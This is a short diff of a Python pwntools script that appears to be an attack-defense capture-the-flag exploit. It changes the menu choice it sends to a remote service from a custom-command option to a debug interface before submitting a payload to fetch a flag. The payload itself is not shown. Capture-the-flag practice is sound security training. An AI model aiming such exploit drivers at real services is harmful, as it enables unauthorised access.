@@ -34,14 +34,14 @@ def get_flag(ip, port, flag_id, token):
 
     p = remote(ip, port)
 
-    p.recvuntil("3 - Custom command", timeout=2)
-    p.sendline("3")
+    p.recvuntil("4 - Debug interface", timeout=2)
+    p.sendline("4")
 
     p.recvuntil("Submit stub", timeout=2)
     p.send(payload + "EOF\n")
 
     print p.recvuntil("DONE!", timeout=2)
-    print p.recvuntil("3 - Custom command")
+    print p.recvuntil("4 - Debug interface")
     p.close()
 
 
